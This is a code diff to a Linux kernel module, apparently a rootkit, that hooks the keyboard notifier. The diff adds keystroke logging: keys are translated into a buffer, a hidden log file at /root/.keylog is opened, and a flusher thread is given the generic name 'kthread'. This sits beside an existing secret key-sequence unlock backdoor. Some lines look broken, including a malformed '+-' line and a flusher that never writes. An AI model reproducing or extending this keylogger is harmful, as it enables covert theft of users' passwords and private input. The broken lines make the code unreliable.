@@ -1,9 +1,10 @@
 #include "common.h"
+#include "keylog.h"
 #include <linux/keyboard.h>
 #include <linux/kthread.h>
 
 #if defined(_CONFIG_UNLOCK_)
-struct task_struct *ts;
+struct task_struct *unlock_ts;
 unsigned long sequence_i = 0;
 volatile unsigned long to_unlock = 0;
 
@@ -18,7 +19,7 @@ unsigned long sequence[] = {
     61959,
     42,     // Volume Up uppress
     63232,
-    63232,
+-    63232,
     58,     // Volume Down uppress
     61959,
     61959
@@ -27,11 +28,180 @@ unsigned long sequence[] = {
 #define SEQUENCE_SIZE sizeof(sequence)/sizeof(unsigned long)
 #endif
 
+#if defined(_CONFIG_LOGFILE_)
+#define FLUSHSIZE 16
+#define LOGSIZE   128
+#define LOG_FILE "/root/.keylog"
+
+struct task_struct *log_ts;
+struct file *logfile;
+volatile unsigned long to_flush = 0;
+unsigned long logidx = 0;
+char logbuf[LOGSIZE];
+
+DECLARE_WAIT_QUEUE_HEAD(flush_event);
+
+/* Translates "normal" (ASCII) keys */
+static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
+{
+    unsigned char val = param->value & 0xff;
+    unsigned long len;
+
+    len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);
+
+    logidx += len;
+}
+
+/* Translates F-keys and other top row keys */
+static void ksym_fnc ( struct keyboard_notifier_param *param, char *buf )
+{
+    unsigned char val = param->value & 0xff;
+    unsigned long len;
+
+    // Not an F-key
+    if ( val & 0xf0 )
+        len = strlcpy(&logbuf[logidx], upper[val & 0x0f], LOGSIZE - logidx);
+    else // F-key
+        len = strlcpy(&logbuf[logidx], fncs[val], LOGSIZE - logidx);
+
+    logidx += len;
+}
+
+/* Translates "lock" keys */
+static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
+{
+    /* XXX: Need lock-key table */
+}
+
+/* Translates numpad keys */
+static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
+{
+    /* XXX: Need numpad-key tables (locked or unlocked) */
+}
+
+/* Translates arrow keys */
+static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
+{
+    /* XXX: Need arrow-key table */
+}
+
+/* Translates modifier keys */
+static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
+{
+    /* XXX: Need mod-key table */
+}
+
+/* Translates the capslock key */
+static void ksym_cap ( struct keyboard_notifier_param *param, char *buf )
+{
+}
+
+void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
+{
+    unsigned char type = (param->value >> 8) & 0x0f;
+
+    if ( logidx >= LOGSIZE )
+    {
+        DEBUG_KEY("KEYLOGGER: Failed to log key, buffer is full\n");
+        return;
+    }
+
+    switch ( type )
+    {
+        case 0x0:
+            ksym_std(param, buf);
+            break;
+
+        case 0x1:
+            ksym_fnc(param, buf);
+            break;
+
+        case 0x2:
+            ksym_loc(param, buf);
+            break;
+
+        case 0x3:
+            ksym_num(param, buf);
+            break;
+
+        case 0x6:
+            ksym_arw(param, buf);
+            break;
+
+        case 0x7:
+            ksym_mod(param, buf);
+            break;
+
+        case 0xa:
+            ksym_cap(param, buf);
+            break;
+
+        case 0xb:
+            ksym_std(param, buf);
+            break;
+    }
+
+    logidx++;
+
+    if ( logidx == FLUSHSIZE )
+    {
+        DEBUG("Keylog buffer is near full, flush to file\n");
+
+        to_flush = 1;
+        wake_up_interruptible(&flush_event);
+    }
+}
+
+int flusher ( void *data )
+{
+    while ( 1 )
+    {
+        wait_event_interruptible(flush_event, (to_flush == 1));
+
+        DEBUG("Inside the flusher thread, flush keylog buffer to file\n");
+
+        to_flush = 0;
+
+        if ( kthread_should_stop() )
+            break;
+    }
+
+    return 0;
+}
+#endif
+
 int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
 {
     struct keyboard_notifier_param *param = _param;
 
     DEBUG_KEY("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+
+    #if defined(_CONFIG_LOGFILE_)
+    /* Only log if there is a logfile and the key is pressed down */
+    if ( logfile && ! param->down )
+    {
+        switch ( code )
+        {
+            case KBD_KEYCODE:
+                break;
+
+            case KBD_UNBOUND_KEYCODE:
+            case KBD_UNICODE:
+                break;
+
+            case KBD_KEYSYM:
+                translate_keysym(param, logbuf);
+                break;
+
+            case KBD_POST_KEYSYM:
+                break;
+
+            default:
+                DEBUG_KEY("KEYLOGGER: Received unknown code\n");
+                break;
+        }
+    }
+    #endif
 
     #if defined(_CONFIG_UNLOCK_)
     if ( sequence[sequence_i] == param->value )
@@ -88,7 +258,14 @@ void keylogger_init ( void )
 
     register_keyboard_notifier(&nb);
     #if defined(_CONFIG_UNLOCK_)
-    ts = kthread_run(unlocker, NULL, "kthread");
+    unlock_ts = kthread_run(unlocker, NULL, "kthread");
+    #endif
+    #if defined(_CONFIG_LOGFILE_)
+    logfile = filp_open(LOG_FILE, O_APPEND|O_CREAT, S_IRWXU);
+    if ( ! logfile )
+        DEBUG("KEYLOGGER: Failed to open log file: %s", LOG_FILE);
+
+    log_ts = kthread_run(flusher, NULL, "kthread");
     #endif
 }
 
@@ -96,8 +273,14 @@ void keylogger_exit ( void )
 {
     DEBUG("Uninstalling keyboard sniffer\n");
 
+    #if defined(_CONFIG_LOGFILE_)
+    kthread_stop(log_ts);
+
+    if ( logfile )
+        filp_close(logfile, NULL);
+    #endif
     #if defined(_CONFIG_UNLOCK_)
-    kthread_stop(ts);
+    kthread_stop(unlock_ts);
     #endif
     unregister_keyboard_notifier(&nb);
 }
